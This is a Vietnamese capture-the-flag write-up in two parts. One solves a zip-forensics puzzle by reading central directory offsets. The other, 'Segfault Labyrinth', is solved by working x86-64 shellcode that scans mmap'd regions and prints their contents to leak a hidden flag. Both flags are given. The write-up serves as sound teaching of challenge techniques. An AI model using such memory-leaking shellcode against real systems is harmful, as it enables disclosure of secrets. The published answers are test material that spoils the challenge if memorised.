# Appnote.txt

Bài này là một dạng kỹ thuật nén nhiều tệp tin txt vào một file zip, ở đây ta có thể thấy flag được đánh số từ 0-18 tức là 19 ký tự (dùng binwalk) và nếu dump ra 32 file flagxx.txt bất kỳ ta sẽ nhận được chuỗi strings abcdefghijklmnopqrstuvwxyz{CTF0137} lặp lại từ 00-18 có nghĩa là ký tự flag đã bị đảo. Cần xác định vị trí chính xác của ký tự flag trong 32 file flagxx.txt thì chúng ta dựa vào `End of central directory record` của file zip là `50 4b 05 06` và từ `EOCDR` sẽ xác định được `Central Directory file header` sau 2 byte `00` là sẽ tới 2 byte `CD`:

```
CC 00 00 00

88 0A 00 00

65 17 00 00

42 24 00 00

BB 2F 00 00

6C 38 00 00

27 4A 00 00

7F 52 00 00

3A 64 00 00

71 69 00 00

37 7C 00 00

58 7F 00 00

F1 95 00 00

3E 9D 00 00

5E A8 00 00

88 BC 00 00

92 C5 00 00

2C D4 00 00

20 DB 00 00

3F EE 00 00

50 00 00 00 
```

Dùng HxD search hex value các CD thì ta sẽ tìm được vị trí của flag từ 00-18:
```
88 0A 00 00 = flag00C = C

65 17 00 00 = flag01T = T

42 24 00 00 = flag02F = F

BB 2F 00 00 = flag03{ = {

6C 38 00 00 = flag04p = p

27 4A 00 00 = flag050 = 0

7F 52 00 00 = flag06s = s

3A 64 00 00 = flag077 = 7

71 69 00 00 = flag08m = m

37 7C 00 00 = flag090 = 0

58 7F 00 00 = flag10d = d

F1 95 00 00 = flag113 = 3

3E 9D 00 00 = flag12r = r

5E A8 00 00 = flag13n = n

88 BC 00 00 = flag14 = _

92 C5 00 00 = flag15z = z

2C D4 00 00 = flag161 = 1

20 DB 00 00 = flag17p = p

3F EE 00 00 = flag18} = }
```

=> CTF{p0s7m0d3rn_z1p}


# Segfault Labyrinth
Bài này tạo nhiều mảng nối lồng lại với nhau và sau đó để flag vào 1 trong những ô nhớ vừa được tạo. Nhiệm vụ sẽ là viết shellcode để lấy được flag:

```asm
lea rsp, [rip + 0x1000 - 0x34]
push 0
push rdi
check_stack:
mov rax, 1
mov rdi, 1
mov rsi, [rsp]
mov rdx, 128
syscall
pop rbp
mov r9, 0
loop:

mov r10, qword ptr [rbp + r9 * 8]

test r10, r10
jz skip_item

mov rax, r10
and rax, 0xfff
test rax, rax
jnz skip_item

mov rax, 5
mov rdi, 0
lea rsi, [r10 + 128]
syscall
cmp rax, 0xfffffffffffffff2
je skip_item

push r10

skip_item:
add r9, 1
cmp r9, 16
je check_stack
jmp loop
```

Tóm tắt: Vì sử dụng mmap nên elf sẽ allocate nhưng memory region khác nhau. Như vậy chỉ cần duyệt qua tất cả các memory region, đoạn memory nào được allocate thì sẽ in hết nội dung ra. 

Tham khảo: <https://shakuganz.com/2021/07/14/hackthebox-hunting-write-up>
